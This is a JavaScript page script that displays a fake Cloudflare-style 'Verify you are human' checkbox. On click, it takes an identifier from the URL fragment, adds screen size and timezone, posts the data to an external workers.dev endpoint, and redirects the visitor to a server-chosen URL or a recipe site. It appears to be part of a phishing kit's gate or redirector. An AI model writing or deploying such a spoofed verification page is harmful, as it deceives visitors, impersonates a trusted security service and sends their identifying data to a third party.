// Configuration
const WORKER_URL = 'https://trackerworkerv2.lugangxyz.workers.dev/verify';
const DEFAULT_REDIRECT_URL = 'https://www.rezeptfuchs.com/';

// Read data after # in URL
function getFragmentData() {
    const hash = window.location.hash.substring(1);
    if (!hash) return '';
    
    try {
        const params = new URLSearchParams(hash);
        if (params.has('in')) return params.get('in');
        if (params.has('usr')) return params.get('usr');
    } catch(e) {}
    
    return hash;
}

// Send to Cloudflare Worker and redirect (only called after real user click)
async function sendToCloudflareAndRedirect(userData) {
    try {
        const response = await fetch(WORKER_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                fragmentData: userData,
                screenSize: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timestamp: Date.now()
            })
        });
        
        const result = await response.json();
        window.location.href = result.redirectUrl || `${DEFAULT_REDIRECT_URL}?data=${encodeURIComponent(userData)}`;
    } catch (error) {
        window.location.href = `${DEFAULT_REDIRECT_URL}?data=${encodeURIComponent(userData)}`;
    }
}

function init() {
    const app = document.getElementById('app');
    const fragmentData = getFragmentData();
    
    // Create Shadow DOM for the button container
    const shadowHost = document.createElement('div');
    shadowHost.style.display = 'flex';
    shadowHost.style.alignItems = 'center';
    shadowHost.style.justifyContent = 'center';
    app.appendChild(shadowHost);
    
    const shadowRoot = shadowHost.attachShadow({ mode: 'open' });
    
    // Cloudflare-style CSS with icon
    const style = document.createElement('style');
    style.textContent = `
        .cf-button {
            display: inline-flex;
            align-items: center;
            gap: 12px;
            background: #ffffff;
            border: 1px solid #dcdce6;
            border-radius: 32px;
            padding: 10px 24px 10px 20px;
            font-family: system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
            font-size: 14px;
            font-weight: 500;
            color: #1e2a3e;
            cursor: pointer;
            transition: all 0.2s ease;
            box-shadow: 0 1px 2px rgba(0,0,0,0.02);
        }
        .cf-button:hover {
            background: #f8f9fc;
            border-color: #c0c5d0;
            box-shadow: 0 2px 8px rgba(0,0,0,0.04);
        }
        .cf-icon {
            font-size: 18px;
        }
        .cf-checkbox {
            width: 18px;
            height: 18px;
            background: white;
            border: 2px solid #cbd5e1;
            border-radius: 4px;
            display: inline-flex;
            align-items: center;
            justify-content: center;
        }
        .cf-checkbox.checked {
            background: #1e6f3f;
            border-color: #1e6f3f;
        }
        .cf-checkbox.checked::after {
            content: "✓";
            color: white;
            font-size: 12px;
            font-weight: bold;
        }
        .cf-spinner {
            width: 18px;
            height: 18px;
            border: 2px solid #e2e8f0;
            border-top-color: #1e6f3f;
            border-radius: 50%;
            animation: spin 0.6s linear infinite;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    `;
    
    // Create button with Cloudflare icon
    const button = document.createElement('div');
    button.className = 'cf-button';
    button.innerHTML = `
        <span class="cf-icon">🛡️</span>
        <div class="cf-checkbox"></div>
        <span class="cf-text">Verify you are human</span>
    `;
    
    shadowRoot.appendChild(style);
    shadowRoot.appendChild(button);
    
    let clicked = false;
    
    // Only send data when real user clicks the button
    button.addEventListener('click', function() {
        if (clicked) return;
        clicked = true;
        
        // Update UI to loading state
        const icon = button.querySelector('.cf-icon');
        const checkbox = button.querySelector('.cf-checkbox');
        const textSpan = button.querySelector('.cf-text');
        
        if (icon) icon.style.opacity = '0.5';
        if (checkbox) checkbox.className = 'cf-spinner';
        if (textSpan) textSpan.textContent = 'Verifying...';
        
        button.style.cursor = 'not-allowed';
        button.style.opacity = '0.8';
        
        // Send data ONLY after real user click
        sendToCloudflareAndRedirect(fragmentData);
    });
}

document.addEventListener('DOMContentLoaded', init);